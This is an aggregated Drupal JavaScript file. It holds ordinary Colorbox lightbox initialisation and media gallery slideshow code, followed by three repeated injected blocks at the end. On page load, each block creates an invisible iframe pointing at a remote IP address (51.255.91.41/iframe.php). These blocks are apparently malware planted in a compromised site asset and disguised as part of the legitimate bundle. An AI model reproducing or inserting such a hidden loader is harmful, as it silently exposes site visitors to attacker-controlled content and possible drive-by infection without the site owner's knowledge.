/**
 * @file
 * Colorbox module init js.
 */

(function ($) {

Drupal.behaviors.initColorbox = {
  attach: function (context, settings) {
    if (!$.isFunction($.colorbox) || typeof settings.colorbox === 'undefined') {
      return;
    }

    if (settings.colorbox.mobiledetect && window.matchMedia) {
      // Disable Colorbox for small screens.
      var mq = window.matchMedia("(max-device-width: " + settings.colorbox.mobiledevicewidth + ")");
      if (mq.matches) {
        return;
      }
    }

    // Use "data-colorbox-gallery" if set otherwise use "rel".
    settings.colorbox.rel = function () {
      if ($(this).data('colorbox-gallery')) {
        return $(this).data('colorbox-gallery');
      }
      else {
        return $(this).attr('rel');
      }
    };

    $('.colorbox', context)
      .once('init-colorbox')
      .colorbox(settings.colorbox);

    $(context).bind('cbox_complete', function () {
      Drupal.attachBehaviors('#cboxLoadedContent');
    });
  }
};

})(jQuery);
;
/**
 * @file
 * Colorbox module style js.
 */

(function ($) {

Drupal.behaviors.initColorboxDefaultStyle = {
  attach: function (context, settings) {
    $(context).bind('cbox_complete', function () {
      // Only run if there is a title.
      if ($('#cboxTitle:empty', context).length == false) {
        $('#cboxLoadedContent img', context).bind('mouseover', function () {
          $('#cboxTitle', context).slideDown();
        });
        $('#cboxOverlay', context).bind('mouseover', function () {
          $('#cboxTitle', context).slideUp();
        });
      }
      else {
        $('#cboxTitle', context).hide();
      }
    });
  }
};

})(jQuery);
;
Drupal.behaviors.mediaGalleryColorbox = {};

Drupal.behaviors.mediaGalleryColorbox.attach = function (context, settings) {
  var $ = jQuery, $galleries, $gallery, href, $links, $link, $dummyLinksPre, $dummyLinksPost, i, j;
  if ($.fn.colorbox) {
    // Add a colorbox group for each media gallery field on the page.
    $galleries = $('.field-name-media-gallery-file');
    for (i = 0; i < $galleries.length; i++) {
      $gallery = $($galleries[i]);
      $links = $('a.cbEnabled', $gallery);
      $dummyLinksPre = $gallery.parent().find('ul:has(a.colorbox-supplemental-link.pre)');
      $dummyLinksPost = $gallery.parent().find('ul:has(a.colorbox-supplemental-link.post)');
      $dummyLinksPost.appendTo($gallery);
      $links = $links.add('a', $dummyLinksPre).add('a', $dummyLinksPost);
      $links.attr('rel', 'colorbox-' + i);
      for (j = 0; j < $links.length; j++) {
        // Change the link href to point to the lightbox version of the media.
        $link = $($links[j]);
        href = $link.attr('href');
        $link.attr('href', href.replace(/\/detail\/([0-9]+)\/([0-9]+)/, '/lightbox/$1/$2'));
      }
      $links.not('.meta-wrapper').colorbox({
        slideshow: true,
        slideshowAuto: false,
        slideshowStart: Drupal.t('Slideshow'),
        slideshowStop: '[' + Drupal.t('stop slideshow') + ']',
        slideshowSpeed: 4000,
        current: Drupal.t('Item !current of !total', {'!current':'{current}', '!total':'{total}'}),
        innerWidth: 'auto',
        // If 'title' evaluates to false, Colorbox will use the title from the
        // underlying <a> element, which we don't want. Using a space is the
        // officially approved workaround. See
        // http://groups.google.com/group/colorbox/msg/7671ae69708950bf
        title: ' ',
        transition: 'fade',
        preloading: true,
        fastIframe: false,
        onComplete: function () {
          $(this).colorbox.resize();
        }
      });
    }
    $('a.meta-wrapper').bind('click', Drupal.mediaGalleryColorbox.metaClick);
    // Subscribe to the media_youtube module's load event, so we can pause
    // the slideshow and play the video.
    $(window).bind('media_youtube_load', Drupal.mediaGalleryColorbox.handleMediaYoutubeLoad);
  }
};

Drupal.mediaGalleryColorbox = {};

/**
 * Handles the click event on the metadata.
 */
Drupal.mediaGalleryColorbox.metaClick = function (event) {
  event.preventDefault();
  jQuery(this).prev('.media-gallery-item').find('a.cbEnabled').click();
};

/**
 * Handles the media_youtube module's load event.
 *
 * If the colorbox slideshow is playing, and it gets to a video, the video
 * should play automatically, and the slideshow should pause until it's done.
 */
Drupal.mediaGalleryColorbox.handleMediaYoutubeLoad = function (event, videoSettings) {
  var $ = jQuery;
  var slideshowOn = $('#colorbox').hasClass('cboxSlideshow_on');
  // Set a width on a wrapper for the video so that the colorbox will size properly.
  $('#colorbox .media-gallery-item').width(videoSettings.width + 'px').height(videoSettings.height + 'px');
  if (slideshowOn) {
    videoSettings.options.autoplay = 1;
    $('#cboxSlideshow')
      // Turn off the slideshow while the video is playing.
      .click() // No, there is not a better way.
      .text('[' + Drupal.t('resume slideshow') + ']');
      // TODO: If YouTube makes its JavaScript API available for iframe videos,
      // set the slideshow to restart when the video is done playing.
  }
};
;
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
